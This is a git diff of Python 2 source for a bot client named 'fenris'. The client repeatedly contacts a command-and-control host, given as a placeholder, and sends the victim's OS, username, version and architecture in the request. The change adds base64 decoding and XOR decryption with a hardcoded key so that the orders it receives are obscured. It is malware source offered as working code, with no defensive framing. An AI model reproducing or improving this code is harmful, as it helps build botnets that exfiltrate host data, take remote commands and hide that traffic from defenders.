@@ -24,6 +24,8 @@ import urllib2
 import platform
 from random import randint
 import time
+import base64
+from itertools import cycle, izip
 
 
 candc = "[DUMMYCANDC]"
@@ -34,7 +36,12 @@ timeFactor = 20
 
 while(True):
         # get fenris orders
-        orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read().split("\n")
+        encryptedOrders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read()
+        orders = base64.b64decode(encryptedOrders)
+        key = "gT8jUdw65h"
+        orders = ''.join(chr(ord(c)^ord(k)) for c,k in izip(orders, cycle(key)))
+        orders = orders.split("\n")
+        
         time.sleep(timeFactor)
     
         # perform action (for extra cuteness)
